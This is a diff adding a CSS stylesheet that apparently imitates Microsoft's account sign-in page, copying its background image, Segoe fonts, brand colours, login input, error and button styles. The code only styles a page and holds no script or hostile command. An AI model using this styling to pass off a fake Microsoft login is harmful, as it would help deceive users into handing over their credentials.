@@ -1,0 +1,199 @@
+body {
+  margin: 0;
+  padding: 0;
+  background-image: url("./microsoft-bg-img.svg");
+  object-fit: cover;
+  height: 100vh;
+  width: 100vw;
+  overflow-x: hidden;
+  font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+  line-height: 1.25rem;
+}
+#root{
+  width: 100%;
+  height: 100%;
+  display: flex;
+  align-items: center;
+}
+.App{
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+  width: 100%;
+}
+
+main {
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+  max-width: 440px;
+  width: calc(100% - 40px);
+  padding: 44px;
+  min-width: 320px;
+  min-height: 250px;
+  overflow: hidden;
+  background-color: #fff;
+  animation: fadeIn 0.3s ease-in;
+  margin: auto;
+}
+
+.key-con{
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+  max-width: 440px;
+  width: calc(100% - 40px);
+  padding: 8px 44px;
+  min-width: 320px;
+  overflow: hidden;
+  background-color: #fff;
+  
+  font-size: .9375rem;
+  margin: auto;
+}
+.key-con-inner{
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+
+.key-con:hover{
+  background-color: #d6d6d6;
+}
+@keyframes fadeIn {
+  0% {
+    opacity: 0;
+  }
+
+  100% {
+    opacity: 1;
+  }
+}
+
+.login-inner {
+  width: 100%;
+  height: 100%;
+}
+
+.title {
+  font-size: 1.5rem;
+  font-weight: 600;
+  margin-top: 16px;
+  margin-bottom: 12px;
+}
+
+.err-mess{
+  width: 100%;
+  color: #e81123;
+  font-size: .9375rem;
+  line-height: 1.25rem;
+}
+
+.login-input {
+  padding: 10px 0;
+  border: 0;
+  border-bottom: 0.5px solid black !important;
+  border-radius: 0;
+  height: 36px;
+  margin-bottom: 16px;
+}
+
+.login-input:focus {
+  outline: none !important;
+  box-shadow: none !important;
+  border-bottom: black 1px solid ;
+}
+
+.no-acc {
+  font-size: .8125rem;
+  font-weight: 400;
+}
+
+.acc-access{
+  margin-bottom: 32px;
+  display: block;
+}
+
+.links{
+  text-decoration: none;
+  color: #0067b8;
+}
+.links:hover{
+  color: black;
+  opacity: 0.7;
+  text-decoration: underline;
+}
+
+button{
+  display: block;
+  padding: 4px 12px 4px 12px;
+  min-width: 108px;
+  min-height: 32px;
+  border: none;
+  opacity: 0.85;
+}
+button:hover{
+  opacity: 1;
+}
+
+.submit-btn button:nth-child(1){
+  background-color: rgba(0,0,0,0.2);
+}
+.submit-btn button:nth-child(2){
+  color: #fff;
+    background-color: #0067b8;
+}
+
+.submit-btn{
+  display: flex;
+  justify-content: flex-end;
+  gap: 5px;
+}
+
+.key-img-con{
+  width: 30px;
+}
+
+input[type="email"]::placeholder{
+  font-size: 90%;
+  opacity: 0.8;
+}
+
+.err-boarder{
+  border-color: #e81123 !important;
+}
+.err-boarder-okay{
+  border-color: black !important;
+}
+.slide-in{
+  animation: slideInFromRight 0.5s ease;
+}
+
+@keyframes slideInFromRight {
+  0% {
+    transform: translateX(100%);
+    opacity: 0;
+  }
+  100% {
+    transform: translateX(0);
+    opacity: 1;
+  }
+}
+
+@media(max-width:600px){
+  main,.key-con{
+    box-shadow: none;
+    padding: 24px !important;
+    width: 100vw;
+  }
+  body{
+    background-image: linear-gradient(white,white);
+  }
+  #root{
+    display: block;
+  }
+  .key-con-inner{
+    border: 0.5px solid black;
+    padding: 8px 40px;
+  }
+  .img-text{
+    width: 100%;
+  }
+}
